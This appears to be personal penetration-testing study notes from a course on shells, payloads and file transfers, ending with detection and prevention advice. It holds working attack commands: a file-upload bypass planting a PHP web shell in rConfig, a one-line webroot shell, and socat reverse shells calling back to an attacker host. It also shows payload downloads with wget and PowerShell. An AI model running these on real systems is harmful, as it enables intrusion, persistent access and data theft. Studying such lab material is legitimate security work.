    [+] Hands-on With a PHP-Based Web Shell.
        > Since PHP processes code & commands on the server-side, we can use pre-written payloads to gain a shell through the browser or initiate a reverse shell session with our attack box. In this case, we will take advantage of the vulnerability in rConfig 3.9.6 to manually upload a PHP web shell and interact with the underlying Linux host. In addition to all the functionality mentioned earlier, rConfig allows admins to add network devices and categorize them by vendor. Go ahead and log in to rConfig with the default credentials (admin:admin), then navigate to Devices > Vendors and click Add Vendor.

        > We will be using WhiteWinterWolf's PHP Web Shell(https://github.com/WhiteWinterWolf/wwwolf-php-webshell). We can download this or copy and paste the source code into a .php file. Keep in mind that the file type is significant, as we will soon witness. Our goal is to upload the PHP web shell via the Vendor Logo browse button. Attempting to do this initially will fail since rConfig is checking for the file type. It will only allow uploading image file types (.png,.jpg,.gif, etc.). However, we can bypass this utilizing Burp Suite.
          sed 's/#.*$//' -e '/^$/d' myshell.php

        > Start Burp Suite, navigate to the browser's network settings menu and fill out the proxy settings. 127.0.0.1 will go in the IP address field, and 8080 will go in the port field to ensure all requests pass through Burp (recall that Burp acts as the web proxy).

        > Our goal is to change the content-type to bypass the file type restriction in uploading files to be "presented" as the vendor logo so we can navigate to that file and have our web shell.
        > Bypassing the File Type Restriction
            + With Burp open and our web browser proxy settings properly configured, we can now upload the PHP web shell. Click the browse button, navigate to wherever our .php file is stored on our attack box, and select open and Save (we may need to accept the PortSwigger Certificate). It will seem as if the web page is hanging, but that's just because we need to tell Burp to forward the HTTP requests. Forward requests until you see the POST request containing our file upload. It will look like this:
            + As mentioned in an earlier section, you will notice that some payloads have comments from the author that explain usage, provide kudos and links to personal blogs. This can give us away, so it's not always best to leave the comments in place. We will change Content-type from application/x-php to image/gif. This will essentially "trick" the server and allow us to upload the .php file, bypassing the file type restriction. Once we do this, we can select Forward twice, and the file will be submitted. We can turn the Burp interceptor off now and go back to the browser to see the results.
            + The message: 'Added new vendor NetVen to Database` lets us know our file upload was successful. We can also see the NetVen vendor entry with the logo showcasing a ripped piece of paper. This means rConfig did not recognize the file type as an image, so it defaulted to that image. We can now attempt to use our web shell. Using the browser, navigate to this directory on the rConfig server:
                /images/vendor/connect.php
            + This executes the payload and provides us with a non-interactive shell session entirely in the browser, allowing us to execute commands on the underlying OS.
        
        > Considerations when Dealing with Web Shells
            + When utilizing web shells, consider the below potential issues that may arise during your penetration testing process:
                - Web applications sometimes automatically delete files after a pre-defined period
                - Limited interactivity with the operating system in terms of navigating the file system, downloading and uploading files, chaining commands together may not work (ex. whoami && hostname), slowing progress, especially when performing enumeration -Potential instability through a non-interactive web shell
                - Greater chance of leaving behind proof that we were successful in our attack
            + Depending on the engagement type (i.e., a black box evasive assessment), we may need to attempt to go undetected and cover our tracks. We are often helping our clients test their capabilities to detect a live threat, so we should emulate as much as possible the methods a malicious attacker may attempt, including attempting to operate stealthily. This will help our client and save us in the long run from having files discovered after an engagement period is over. In most cases, when attempting to gain a shell session with a target, it would be wise to establish a reverse shell and then delete the executed payload. Also, we must document every method we attempt, what worked & what did not work, and even the names of the payloads & files we tried to use. We could include a sha1sum or MD5 hash of the file name, upload locations in our reports as proof, and provide attribution.
  



		> However, if we only have remote command execution through an exploit, we can write our shell directly to the webroot to access it over the web. So, the first step is to identify where the webroot is. The following are the default webroots for common web servers:
		> Default webroots for common web servers
			Web Server 	Default Webroot
			Apache 	/var/www/html/
			Nginx 	/usr/local/nginx/html/
			IIS 	c:\inetpub\wwwroot\
			XAMPP 	C:\xampp\htdocs\
		> We can check these directories to see which webroot is in use and then use echo to write out our web shell. For example, if we are attacking a Linux host running Apache, we can write a PHP shell with the following command:
			echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
		[+] Accessing web shell. Once we write our web shell, we can either access it through a browser or by using cURL. We can visit the shell.php page on the compromised website, and use ?cmd=id to execute the id command:
			> By Curl
				curl http://SERVER_IP:PORT/shell.php?cmd=id
			> By Browser
				http://SERVER_IP:PORT/shell.php?cmd=id
		> A great benefit of a web shell is that it would bypass any firewall restriction in place, as it will not open a new connection on a port but run on the web port on 80 or 443, or whatever port the web application is using. Another great benefit is that if the compromised host is rebooted, the web shell would still be in place, and we can access it and get command execution without exploiting the remote host again.

		> On the other hand, a web shell is not as interactive as reverse and bind shells are since we have to keep requesting a different URL to execute our commands. Still, in extreme cases, it is possible to code a Python script to automate this process and give us a semi-interactive web shell right within our terminal.

* Upgrading TTY
	[+] Linux
	    > There may be times that we land on a system with a limited shell, and Python is not installed. In these cases, it's good to know that we could use several different methods to spawn an interactive shell. Let's examine some of them.
	    > Know that whenever we see /bin/sh or /bin/bash, this could also be replaced with the binary associated with the shell interpreter language present on that system. With most Linux systems, we will likely come across bourne shell (/bin/sh) and bourne again shell (/bin/bash) present on the system natively.
		/bin/sh -i
		    #This command will execute the shell interpreter specified in the path in interactive mode (-i).
		perl —e 'exec "/bin/sh";'
		perl: exec "/bin/sh";
		    #The command directly above should be run from a script.
		ruby: exec "/bin/sh"
		    #If the programming language Ruby is present on the system, this command will execute the shell interpreter specified:
		    #The command directly above should be run from a script.
		lua: ox.execute('/bin/sh')
		    #If the programming language Lua is present on the system, we can use the os.execute method to execute the shell interpreter specified using the full command below:
		    #The command directly above should be run from a script.
		awk 'BEGIN {system("/bin/sh")}'
		    #AWK is a C-like pattern scanning and processing language present on most UNIX/Linux-based systems, widely used by developers and sysadmins to generate reports. It can also be used to spawn an interactive shell. 
		find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;
		find . -exec /bin/sh \; -quit
		vim -c ':!/bin/sh'
		    #Vim to shell
		vim
		:set shell=/bin/sh
		:shell
		    #Vim escape



		script /dev/null -c bash OR whereis python and python -c 'import pty;pty.spawn("/bin/bash")'
  		ctrl + z 
  		stty raw -echo
  		fg  ==> Once we hit fg, it will bring back our netcat shell to the foreground. At this point, the terminal will show a blank line. We can hit enter again to get back to our shell or input reset and hit enter to bring it back. At this point, we would have a fully working TTY shell with command history and everything else.
  		reset 
  		xterm 
  		export TERM=xterm or xterm-256color ==> In our machine echo $TERM
  		export SHELL=bash
		stty -a ==> En nuestra terminal 
  		stty rows [x] cols [x]

		!!Note that if the shell dies, any input in your own terminal will not be visible (as a result of having disabled terminal echo). To fix this, type reset and press enter.
	    
	> Powershell
		rlwrap nc -lvnp <port>
		stty raw -echo;fg 
* Socat
	We would like to transfer a socat static compiled binary
  	sudo python3 -m http.server 80 
  	On the target machine
  		Linux: wget <LOCAL-IP>/socat -O /tmp/socat
  	  	Windows: Invoke-WebRequest -uri <LOCAL-IP>/socat.exe -outfile C:\\Windows\temp\socat.exe 
	https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#method-2-using-socat
		On Kali (listen):
			socat file:`tty`,raw,echo=0 tcp-listen:4444
		On Victim (launch):
			socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444

    > Most machines do not have socat installed by default, however, it's possible to upload a precompiled socat binary, which can then be executed as normal.
      Reverse shells
          socat TCP-L:<port> - #Equivalent to nc -lvnp <port>. 
          Linux: socat TCP:<LOCAL-IP:<LOCAL-PORT> EXEC:"bash -li"
          Windows: socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes #Pipes used to force powershell or cmd.exe to use Unix style standard input and output
      
      Bind shells
          socat TCP:<TARGET-IP>:<TARGET-PORT> -
          Linux: socat TCP-L:<PORT> EXEC:"bash -li"
          Windows: socat TCP-L:<PORT> EXEC:powershell.exe,pipes

    > Fully stable Linux TTY reverse shell. Only on Linux.
        socat TCP-L:<port> FILE:`tty`,raw,echo=0
        socat TCP:<attacker-ip>:<attacker-port> EXEC:"bash -li",pty,stderr,sigint,setsid,sane
          pty, allocates a pseudoterminal on the target -- part of the stabilisation process
          stderr, makes sure that any error messages get shown in the shell (often a problem with non-interactive shells)
          sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
          setsid, creates the process in a new session
          sane, stabilises the terminal, attempting to "normalise" it.
      If, at any point, a socat shell is not working correctly, it's well worth increasing the verbosity by adding -d -d into the command. This is very useful for experimental purposes, but is not usually necessary for general use.

    > Encrypted shells 
      openssl req --newkey rsa:2048 -nodes -keyout shell.ke -x509 -days 362 -out shell.crt
      We then need to merge the two files into a single .pem file:
        cat shell.key shell.crt > shell.pem
      Reverse shell
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 -
        socat OPENSSL:<LOCAL-IP>:<LOCAL-PORT>,verify=0 EXEC:/bin/bash
      Bind shell
        socat OPENSSL:<TARGET-IP>:<TARGET-PORT>,verify=0 -
        socat OPENSSL-LISTEN:<PORT>,cert=shell.pem,verify=0 EXEC:cmd.exe,pipes

      verify=0 tells the connection to not bother trying to validate that our certificate has been properly signed by a recognised authority. Please note that the certificate must be used on whichever device is listening.

      Example: socat OPENSSL-LISTEN:53,cert=encrypt.pem,verify=0 FILE:`tty`,raw,echo=0

[+] Infiltrating Windows 
	> Since many of us can remember, Microsoft has dominated the home and enterprise markets for computing. In modern days, with the introduction of improved Active Directory features, more interconnectivity with cloud services, Windows subsystem for Linux, and much more, the Microsoft attack surface has grown as well.
	> For example, just in the last five years, there have been 3688 reported vulnerabilities just within Microsoft Products, and this number grows daily. This table was derived from HERE => (https://www.cvedetails.com/vendor/26/Microsoft.html)


* Prominent Windows Exploits
	> Over the last few years, several vulnerabilities in the Windows operating system and their corresponding attacks are some of the most exploited vulnerabilities of our time. Let's discuss those for a minute:
	Vulnerability	Description
	MS08-067	MS08-067 was a critical patch pushed out to many different Windows revisions due to an SMB flaw. 
			This flaw made it extremely easy to infiltrate a Windows host. It was so efficient that the Conficker worm was 
			using it to infect every vulnerable host it came across. Even Stuxnet took advantage of this vulnerability.
	Eternal Blue	MS17-010 is an exploit leaked in the Shadow Brokers dump from the NSA. This exploit was most notably used in the WannaCry 
			ransomware and NotPetya cyber attacks. This attack took advantage of a flaw in the SMB v1 protocol allowing for code execution. 
			EternalBlue is believed to have infected upwards of 200,000 hosts just in 2017 and is still a common way to find access into a vulnerable Windows host.
	PrintNightmare	A remote code execution vulnerability in the Windows Print Spooler. With valid credentials for that host or a low privilege shell, you can 
			install a printer, add a driver that runs for you, and grants you system-level access to the host. 
			This vulnerability has been ravaging companies through 2021. 0xdf wrote an awesome 
			post on it here. => (https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
	BlueKeep	CVE 2019-0708 is a vulnerability in Microsoft's RDP protocol that allows for Remote Code Execution. 
			This vulnerability took advantage of a miss-called channel to gain code execution, affecting every Windows revision from Windows 2000 to Server 2008 R2.
	Sigred		CVE 2020-1350 utilized a flaw in how DNS reads SIG resource records. It is a bit more complicated than the other exploits 
			on this list, but if done correctly, it will give the attacker Domain Admin privileges since it will affect the domain's DNS server 
			which is commonly the primary Domain Controller.
	SeriousSam	CVE 2021-36924 exploits an issue with the way Windows handles permission on the C:\Windows\system32\config folder. Before fixing the 
			issue, non-elevated users have access to the SAM database, among other files. This is not a huge issue since the files can't be 
			accessed while in use by the pc, but this gets dangerous when looking at volume shadow copy backups. These same privilege mistakes 
			exist on the backup files as well, allowing an attacker to read the SAM database, dumping credentials.
	Zerologon	CVE 2020-1472 is a critical vulnerability that exploits a cryptographic flaw in Microsoft’s Active Directory Netlogon 
			Remote Protocol (MS-NRPC). It allows users to log on to servers using NT LAN Manager (NTLM) and even send account changes via 
			the protocol. The attack can be a bit complex, but it is trivial to execute since an attacker would have to make around 256 guesses 
			at a computer account password before finding what they need. This can happen in a matter of a few seconds.

* Enumerating Windows & Fingerprinting methods
	> Since we have a set of targets, what are a few ways to determine if the host is likely a Windows Machine? To answer this question, we can look at a few things. The first one being the Time To Live (TTL) counter when utilizing ICMP to determine if the host is up. A typical response from a Windows host will either be 32 or 128. A response of or around 128 is the most common response you will see. This value may not always be exact, especially if you are not in the same layer three network as the target. We can utilize this value since most hosts will never be more than 20 hops away from your point of origin, so there is little chance of the TTL counter dropping into the acceptable values of another OS type. In the ping output below, we can see an example of this. For the example, we pinged a Windows 10 host and can see we have received replies with a TTL of 128. Check out this link(https://subinsb.com/default-device-ttl-values/) for a nice table showing other TTL values by OS.


* Bats, DLLs, & MSI Files, Oh My!

	> When it comes to creating payloads for Windows hosts, we have plenty of options to choose from. DLLs, batch files, MSI packages, and even PowerShell scripts are some of the most common methods to use. Each file type can accomplish different things for us, but what they all have in common is that they are executable on a host. Try to keep your delivery mechanism for the payload in mind, as this can determine what type of payload you use.
	[+] Payload Types to Consider

    		+ DLLs A Dynamic Linking Library (DLL) is a library file used in Microsoft operating systems to provide shared code and data that can be used by many different programs at once. These files are modular and allow us to have applications that are more dynamic and easier to update. As a pentester, injecting a malicious DLL or hijacking a vulnerable library on the host can elevate our privileges to SYSTEM and/or bypass User Account Controls. => (https://docs.microsoft.com/en-us/troubleshoot/windows-client/deployment/dynamic-link-library)
    		+ Batch Batch files are text-based DOS scripts utilized by system administrators to complete multiple tasks through the command-line interpreter. These files end with an extension of .bat. We can use batch files to run commands on the host in an automated fashion. For example, we can have a batch file open a port on the host, or connect back to our attacking box. Once that is done, it can then perform basic enumeration steps and feed us info back over the open port. => (https://commandwindows.com/batch.htm)
    		+ VBS VBScript is a lightweight scripting language based on Microsoft's Visual Basic. It is typically used as a client-side scripting language in webservers to enable dynamic web pages. VBS is dated and disabled by most modern web browsers but lives on in the context of Phishing and other attacks aimed at having users perform an action such as enabling the loading of Macros in an excel document or clicking on a cell to have the Windows scripting engine execute a piece of code. => (https://www.guru99.com/introduction-to-vbscript.html)
    		+ MSI .MSI files serve as an installation database for the Windows Installer. When attempting to install a new application, the installer will look for the .msi file to understand all of the components required and how to find them. We can use the Windows Installer by crafting a payload as an .msi file. Once we have it on the host, we can run msiexec to execute our file, which will provide us with further access, such as an elevated reverse shell. => (https://docs.microsoft.com/en-us/windows/win32/msi/windows-installer-file-extensions)
    		+ Powershell Powershell is both a shell environment and scripting language. It serves as Microsoft's modern shell environment in their operating systems. As a scripting language, it is a dynamic language based on the .NET Common Language Runtime that, like its shell component, takes input and output as .NET objects. PowerShell can provide us with a plethora of options when it comes to gaining a shell and execution on a host, among many other steps in our penetration testing process. => (https://docs.microsoft.com/en-us/powershell/scripting/overview?view=powershell-7.1)

	> Now that we understand what each type of Windows file can be used for let's discuss some basic tools, tactics, and procedures for building our payloads and delivering them onto the host to land a shell.


* Tools, Tactics, and Procedures for Payload Generation, Transfer, and Execution

	> Below you will find examples of different payload generation methods and ways to transfer our payloads to the victim. We will talk about some of these methods at a high level since our focus is on the payload generation itself and the different ways to acquire a shell on the target.
		[+] Payload Generation
			> We have plenty of good options for dealing with generating payloads to use against Windows hosts. We touched on some of these already in previous sections. For example, the Metasploit-Framework and MSFVenom is a very hand way to generate payloads since it is OS agnostic. The table below lays out some of our options. However, this is not an exhaustive list, and new resources come out daily.

			Resource				Description
			+ MSFVenom & Metasploit-Framework	MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate 
								hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation 
								actions once on the host. Think of it as a swiss-army knife.
			+ Payloads All The Things		Here, you can find many different resources and cheat sheets for payload generation and general methodology.
			+ Mythic C2 Framework			The Mythic C2 framework is an alternative option to Metasploit as a Command 
								and Control Framework and toolbox for unique payload generation.
			+ Nishang				Nishang is a framework collection of Offensive PowerShell implants and scripts. 
								It includes many utilities that can be useful to any pentester.
			+ Darkarmour				Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.

		[+] Payload Transfer and Execution:
			> Besides the vectors of web-drive-by, phishing emails, or dead drops, Windows hosts can provide us with several other avenues of payload delivery. The list below includes some helpful tools and protocols for use while attempting to drop a payload on a target.

    			+ Impacket: Impacket is a toolset built-in Python that provides us a way to interact with network protocols directly. Some of the most exciting tools we care about in Impacket deal with psexec, smbclient, wmi, Kerberos, and the ability to stand up an SMB server.
    			+ Payloads All The Things: is a great resource to find quick oneliners to help transfer files across hosts expediently.
    			+ SMB: SMB can provide an easy to exploit route to transfer files between hosts. This can be especially useful when the victim hosts are domain joined and utilize shares to host data. We, as attackers, can use these SMB file shares along with C$ and admin$ to host and transfer our payloads and even exfiltrate data over the links.
    			+ Remote execution via MSF: Built into many of the exploit modules in Metasploit is a function that will build, stage, and execute the payloads automatically.
    			+ Other Protocols: When looking at a host, protocols such as FTP, TFTP, HTTP/S, and more can provide you with a way to upload files to the host. Enumerate and pay attention to the functions that are open and available for use.

			> Now that we know what tools, tactics, and procedures we can use to transfer our payloads, let's check out an example compromise 

* CMD-Prompt and Power[Shell]s for Fun and Profit.
	> CMD shell is the original MS-DOS shell built into Windows. It was made for basic interaction and I.T. operations on a host. Some simple automation could be achieved with batch files, but that was all. Powershell came along with a purpose to expand the capabilities of cmd. PowerShell understands the native MS-DOS commands utilized in CMD and a whole new set of commands based in .NET. New self-sufficient modules can also be implemented into PowerShell with cmdlets. CMD prompt deals with text input and output while Powershell utilizes .NET objects for all input and output. Another important consideration is that CMD does not keep a record of the commands used during the session whereas, PowerShell does. So in the context of being stealthy, executing commands with cmd will leave less of a trace on the host. Other potential problems such as Execution Policy and User Account Control (UAC) can inhibit your ability to execute commands and scripts on the host. These considerations affect PowerShell but not cmd. Another big concern to take into account is the age of the host. If you land on a Windows XP or older host ( yes, it's still possible..) PowerShell is not present, so your only option will be cmd. PowerShell did not come to fruition until Windows 7. So to sum it all up:
	> Use CMD when:
    		+ You are on an older host that may not include PowerShell.
    		+ When you only require simple interactions/access to the host.
    		+ When you plan to use simple batch files, net commands, or MS-DOS native tools.
    		+ When you believe that execution policies may affect your ability to run scripts or other actions on the host.
	> Use PowerShell when:
    		+ You are planning to utilize cmdlets or other custom-built scripts.
    		+ When you wish to interact with .NET objects instead of text output.
    		+ When being stealthy is of lesser concern.
    		+ If you are planning to interact with cloud-based services and hosts.
    		+ If your scripts set and use Aliases.

* WSL and PowerShell For Linux

	> The Windows Subsystem for Linux is a powerful new tool that has been introduced to Windows hosts that provides a virtual Linux environment built into your host. We mention this because the rapidly changing landscape of operating systems may very well allow for novel ways of gaining access to a host. When writing this module, several examples of malware in the wild were attempting to utilize Python3 and Linux binaries to download and install payloads onto a Windows host via WSL. Much like in this post here, attackers are also using built-in Python libraries that are native to both Windows and Linux alongside PowerShell to perform other actions on the host. One other thing to note is currently, any network requests or functions executed to or from the WSL instance are not parsed by the Windows Firewall and Windows Defender, making it a bit of a blind spot on the host.
	> The same issues can currently be found via PowerShell Core, which can be installed on Linux operating systems and carry over many normal PowerShell functions. These two concepts are exceptionally sneaky because, to date, not much is known about the vectors of attack or ways to watch for them. But attacks aimed at these features have been seen to avoid AV and EDR detection mechanisms. These concepts are a bit advanced for this module but look for them in a future module.

[+] Infiltrating Unix/Linux
    > One detail that can be overlooked when relying on MSF to find an exploit module for a specific application is the version of MSF. There may be useful exploit modules that are not installed on our system or just aren't showing up via search. In these cases, it's good to know that Rapid 7 keeps code for exploit modules in their repos on github. We could do an even more specific search using a search engine: rConfig 3.9.6 exploit metasploit github

    > This search can point us to the source code for an exploit module called rconfig_vendors_auth_file_upload_rce.rb. This exploit can get us a shell session on a target Linux box running rConfig 3.9.6. If this exploit did not show up in the MSF search, we can copy the code from this repo onto our local attack box and save it in the directory that our local install of MSF is referencing. To do this, we can issue this command on our attack box:
	locate exploits
    > We want to look for the directories in the output associated with Metasploit Framework. On Pwnbox, Metasploit exploit modules are kept in:

	/usr/share/metasploit-framework/modules/exploits

    > We can copy the code into a file and save it in /usr/share/metasploit-framework/modules/exploits/linux/http similar to where they are storing the code in the GitHub repo. We should also keep msf up to date using the command msfupdate or your local package manager. Once we find the exploit module and download it (we can use wget) or copy it into the proper directory from Github, we can use it to gain a shell session on the target. If we copy it into a file on our local system, make sure the file has .rb as the extension. All modules in MSF are written in Ruby


-=-=
[+] Detection and Prevention
* Monitoring 
    > When it comes to looking for and identifying active shells, payload delivery and execution, and potential attempts to subvert our defenses, we have many different options to utilize to detect and respond to these events. Before talking about data sources and tools we can use, let's take a second to talk about the MITRE ATT&CK Framework and define the techniques and tactics being utilized by attackers. The ATT&CK Framework as defined by MITRE, is "a globally-accessible knowledge base of adversary tactics and techniques based on real-world observations."

    > Keeping the framework in mind, three of the most notable techniques we can tie to Shells & Payloads are listed below in the table with descriptions.
        + Notable MITRE ATT&CK Tactics and Techniques:

Tactic / Technique	Description
Initial Access	    Attackers will attempt to gain initial access by compromising a public-facing host or service such as web Applications, 
                    misconfigured services such as SMB or authentication protocols, and/or bugs in a public-facing host that introduce a vulnerability. 
                    This is often done on some form of bastion host and provides the attacker with a foothold in the network but not yet full access. 
                    For more information on initial access, especially via Web Applications, check out the OWASP Top Ten or read further in the Mitre Att&ck framework.
Execution	        This technique depends on code supplied and planted by an attacker running on the victim host. The Shells & Payloads module focuses 
                    mainly on this tactic. We utilize many different payloads, delivery methods, and shell scripting solutions to access a host. 
                    This can be anything from the execution of commands within our web browser to get execution and access on a Web 
                    Application, issuing a PowerShell one-liner via PsExec, taking advantage of a publicly released exploit or zero-day in conjunction with a 
                    framework such as Metasploit, or uploading a file to a host via many different protocols and calling it remotely to receive a callback.
Command & Control	Command and Control (C2) can be looked at as the culmination of our efforts within this module. We gain access to a host and establish 
                    some mechanism for continued and/or interactive access via code execution, then utilize that access to perform follow on actions on objectives 
                    within the victim network. The use of standard ports and protocols within the victim network to issue commands and receive output from the 
                    victim is common. This can appear as anything from normal web traffic over HTTP/S, commands issued via other common external protocols such as 
                    DNS and NTP, and even the use of common allowed applications such as Slack, Discord, or MS Teams to issue commands and receive check-ins. C2 can 
                    have various levels of sophistication varying from basic clear text channels like Netcat to utilizing encrypted and obfuscated protocols along 
                    with complex traffic routes via proxies, redirectors, and VPNs.

+ Events To Watch For:

    > File uploads: Especially with Web Applications, file uploads are a common method of acquiring a shell on a host besides direct command execution in the browser. Pay attention to application logs to determine if anyone has uploaded anything potentially malicious. The use of firewalls and anti-virus can add more layers to your security posture around the site. Any host exposed to the internet from your network should be sufficiently hardened and monitored.
    > Suspicious non-admin user actions: Looking for simple things like normal users issuing commands via Bash or cmd can be a significant indicator of compromise. When was the last time an average user, much less an admin, had to issue the command whoami on a host? Users connecting to a share on another host in the network over SMB that is not a normal infrastructure share can also be suspicious. This type of interaction usually is end host to infrastructure server, not end host to end host. Enabling security measures such as logging all user interactions, PowerShell logging, and other features that take note when a shell interface is used will provide you with more insight.
    > Anomalous network sessions: Users tend to have a pattern they follow for network interaction. They visit the same websites, use the same applications, and often perform those actions multiple times a day like clockwork. Logging and parsing NetFlow data can be a great way to spot anomalous network traffic. Looking at things such as top talkers, or unique site visits, watching for a heartbeat on a nonstandard port (like 4444, the default port used by Meterpreter), and monitoring any remote login attempts or bulk GET / POST requests in short amounts of time can all be indicators of compromise or attempted exploitation. Using tools like network monitors, firewall logs, and SIEMS can help bring a bit of order to the chaos that is network traffic.

+ Establish Network Visibility

    > Much like identifying and then using various shells & payloads, detection & prevention requires a detailed understanding of the systems and overall network environment you are trying to protect. It's always essential to have good documentation practices so individuals responsible for keeping the environment secure can have consistent visibility of the devices, data, and traffic flow in the environments they administer. Developing & maintaining visual network topology diagrams can help visualize network traffic flow. Newer tools like netbrain(https://www.netbraintech.com/) may be good to research as they combine visual diagraming that can be achieved with tools like Draw.io(https://draw.io/), documentation and remote management. Interactive visual network topologies allow you to interact with the routers, network firewalls, IDS/IPS appliances, switches, and hosts (clients). Tools like this are becoming more common to use as it can be challenging to keep the visibility of the network updated, especially in larger environments that are constantly growing.
    > Some network device vendors like Cisco Meraki, Ubiquiti, Check Point, and Palo Alto Networks are building layer 7 visibility (like layer 7 of the OSI model) into their network devices and moving the management capabilities to cloud-based network controllers. This means admins log in to a web portal to manage all the network devices in the environment. A visual dashboard is often provided with these cloud-based network controllers making it easier to have a baseline of the traffic usage, network protocols, applications, and inbound & outbound traffic. Having and understanding the baseline of your network will make any deviation from the norm extremely visible. The faster you can react and triage any potential issue, the less time for possible leaks, destruction of data, or worse.
    > Keep in mind that if a payload is successfully executed, it will need to communicate over the network, so this is why network visibility is essential within the context of shells & payloads. Having a network security appliance capable of deep packet inspection can often act as an anti-virus for the network. Some of the payloads we discussed could get detected & blocked at the network level if successfully executed on the hosts. This is especially easy to detect if traffic is not encrypted. When we used Netcat in the bind & reverse shell sections, the traffic passing between the source and destination (target) was not encrypted. Someone could capture that traffic and see every command we sent between our attack box and the target


+ Protecting end devices
    > End devices are the devices that connect at the "end" of a network. This means they are either the source or destination of data transmission. Some examples of end devices would be:
        Workstations (employees computers)
        Servers (providing various services on the network)
        Printers
        Network Attached Storage (NAS)
        Cameras
        Smart TVs
        Smart Speakers

    > We should prioritize the protection of these kinds of devices, especially those that run an operating system with a CLI that can be remotely accessed. The same interface that makes it easy to administer and automate tasks on a device can make it a good target for attackers. As simple as this seems, having anti-virus installed & enabled is a great start. The most common successful attack vector besides misconfiguration is the human element. All it takes is for a user to click a link or open a file, and they can be compromised. Having monitoring and alerting on your end devices can help detect and potentially prevent issues before they happen.
    > On Windows systems, Windows Defender (also known as Windows Security or Microsoft Defender) is present at install and should be left enabled. Also, ensuring the Defender Firewall is left enabled with all profiles (Domain, Private and Public) left on. Only make exceptions for approved applications based on a change management process. Establish a patch management strategy (if not already established) to ensure that all hosts are receiving updates shortly after Microsoft releases them. All of this applies to servers hosting shared resources and websites as well. Though it can slow performance, AV on a server can prevent the execution of a payload and the establishment of a shell session with a malicious attacker's system.

Imagine the following scenario
  > During an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer PowerUp.ps1 (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the Application Control Policy. We perform our local enumeration manually and find that we have SeImpersonatePrivilege. We need to transfer a binary to our target machine to escalate privileges using the PrintSpoofer tool. We then try to use Certutil to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the Impacket smbserver tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user. 
  > Understanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.
[+] File transfer methods
  * Windows File Transfer Methods
    > The Windows operating system has evolved over the past few years, and new versions come with different utilities for file transfer operations. Understanding file transfer in Windows can help both attackers and defenders. Attackers can use various file transfer methods to operate and avoid being caught. Defenders can learn how these methods work to monitor and create the corresponding policies to avoid being compromised. Let's use the Microsoft Astaroth Attack blog post as an example of an advanced persistent threat (APT).
      + The blog post starts out talking about fileless threats. The term fileless suggests that a threat doesn't come in a file, they use legitimate tools built into a system to execute an attack. This doesn't mean that there's not a file transfer operation. As discussed later in this section, the file is not "present" on the system but runs in memory.
      + The Astaroth attack generally followed these steps: A malicious link in a spear-phishing email led to an LNK file. When double-clicked, the LNK file caused the execution of the WMIC tool with the "/Format" parameter, which allowed the download and execution of malicious JavaScript code. The JavaScript code, in turn, downloads payloads by abusing the Bitsadmin tool.
      + All the payloads were base64-encoded and decoded using the Certutil tool resulting in a few DLL files. The regsvr32 tool was then used to load one of the decoded DLLs, which decrypted and loaded other files until the final payload, Astaroth, was injected into the Userinit process.

* Download operations
  > We have access to the machine MS02, and we need to download a file from our Pwnbox machine. Let's see how we can accomplish this using multiple File Download methods.

[+] PowerShell Base64 Encode & Decode
  > Depending on the file size we want to transfer, we can use different methods that do not require network communication. If we have access to a terminal, we can encode a file to a base64 string, copy its contents from the terminal and perform the reverse operation, decoding the file in the original content. Let's see how we can do this with PowerShell.
  > An essential step in using this method is to ensure the file you encode and decode is correct. We can use md5sum, a program that calculates and verifies 128-bit MD5 checksums. The MD5 hash functions as a compact digital fingerprint of a file, meaning a file should have the same MD5 hash everywhere. Let's attempt to transfer a sample ssh key. It can be anything else, from our Pwnbox to the Windows target.
     md5sum id_rsa
     cat id_rsa | base64 -w 0;echo 
  > We can copy this content and paste it into a Windows PowerShell terminal and use some PowerShell functions to decode it.

  > Finally, we can confirm if the file was transferred successfully using the Get-FileHash cmdlet, which does the same thing that md5sum does.
    Get-FileHash C:\Users\Public\id_rsa -Algorithm md5

  > NOTE: While this method is convenient, it's not always possible to use. Windows Command Line utility (cmd.exe) has a maximum string length of 8,191 characters. Also, a web shell may error if you attempt to send extremely large strings. 

[+] PowerShell Web Downloads
  > Most companies allow HTTP and HTTPS outbound traffic through the firewall to allow employee productivity. Leveraging these transportation methods for file transfer operations is very convenient. Still, defenders can use Web filtering solutions to prevent access to specific website categories, block the download of file types (like .exe), or only allow access to a list of whitelisted domains in more restricted networks.

  > PowerShell offers many file transfer options. In any version of PowerShell, the System.Net.WebClient(https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-5.0) class can be used to download a file over HTTP, HTTPS or FTP. The following table(https://docs.microsoft.com/en-us/dotnet/api/system.net.webclient?view=net-6.0) describes WebClient methods for downloading data from a resource:
      Method	            Description
      OpenRead	          Returns the data from a resource as a Stream(https://learn.microsoft.com/en-us/dotnet/api/system.io.stream?view=net-6.0)
      OpenReadAsync	      Returns the data from a resource without blocking the calling thread.
      DownloadData	      Downloads data from a resource and returns a Byte array.
      DownloadDataAsync	  Downloads data from a resource and returns a Byte array without blocking the calling thread.
      DownloadFile	      Downloads data from a resource to a local file.
